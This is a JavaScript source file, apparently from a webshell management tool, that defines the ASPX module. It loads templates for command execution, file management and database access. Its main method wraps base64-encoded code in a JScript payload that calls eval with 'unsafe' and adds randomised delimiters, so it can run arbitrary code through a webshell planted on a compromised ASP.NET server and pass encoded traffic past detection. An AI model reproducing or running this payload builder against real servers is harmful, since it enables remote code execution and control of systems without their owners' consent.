/**
 * ASPX服务端脚本模板
 * 开写：2016/04/12
 * 更新：-
 * 作者：蚁逅 <https://github.com/antoor>
 *
 * 更新: 2016/04/23
 *     - 优化 aspx 编码规则
 * 作者：Medici.Yan <https://github.com/Medicean>
 */
'use strict';

// import Base from '../base';
const Base = require('../base');

class ASPX extends Base {
  constructor(opts) {
    super(opts);
    // 解析模板
    [
      'base',
      'command',
      'filemanager',
      'database/dsn',
      'database/mysql',
      'database/access',
      'database/oracle',
      'database/sqlserver',
      'database/sqloledb_1',
      'database/sqloledb_1_sspi',
      'database/microsoft_jet_oledb_4_0'
    ].map((_) => {
      this.parseTemplate(`./aspx/template/${_}`);
    });
    // 解析编码器
    this
      .encoders
      .map((_) => {
        this.parseEncoder(`./aspx/encoder/${_}`);
      });
    this
      .decoders
      .map((_) => {
        this.parseDecoder(`./aspx/decoder/${_}`);
      });
  }

  /**
   * 获取编码器列表
   * @return {array} 编码器列表
   */
  get encoders() {
    return ["base64", "hex", "url_unicode"];
  }

  get decoders() {
    return ["default"];
  }

  /**
   * HTTP请求数据组合函数
   * @param  {Object} data 通过模板解析后的代码对象
   * @return {Promise}     返回一个Promise操作对象
   */
  complete(data, force_default = false) {
    // 分隔符号
    let tag_s, tag_e;
    if (this.__opts__['otherConf'].hasOwnProperty('use-custom-datatag') && this.__opts__['otherConf']['use-custom-datatag'] == 1 && this.__opts__['otherConf']['custom-datatag-tags']) {
      tag_s = this.__opts__['otherConf']['custom-datatag-tags'];
    } else {
      tag_s = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // "->|";
    }
    if (this.__opts__['otherConf'].hasOwnProperty('use-custom-datatag') && this.__opts__['otherConf']['use-custom-datatag'] == 1 && this.__opts__['otherConf']['custom-datatag-tage']) {
      tag_e = this.__opts__['otherConf']['custom-datatag-tage'];
    } else {
      tag_e = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // "|<-";
    }

    // let formatter = new this.format(this.__opts__['encode']);
    let formatter = Base
      .prototype
      .format(this.__opts__);

    let aspxencode = this.__opts__['encode'];

    switch (this.__opts__['encode']) {
      case "UTF8":
        aspxencode = "UTF-8";
        break;
      default:
        break;
    }
    // 替换代码中的 GetEncoding("!{ANT::ENDOCE}").GetString 的 tag
    data['_'] = data['_'].replace(/!{ANT::ENDOCE}/g, aspxencode);
    // base64编码一次数据
    let base64Code = formatter['base64'](data['_']);

    data['_'] = `Response.Write("${tag_s}");var err:Exception;try{eval(System.Text.Encoding.GetEncoding("${aspxencode}").GetString(System.Convert.FromBase64String("${base64Code}")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.Write("${tag_e}");Response.End();`;

    // 使用编码器进行处理并返回
    return this.encodeComplete(tag_s, tag_e, data);
  }
}

module.exports = ASPX;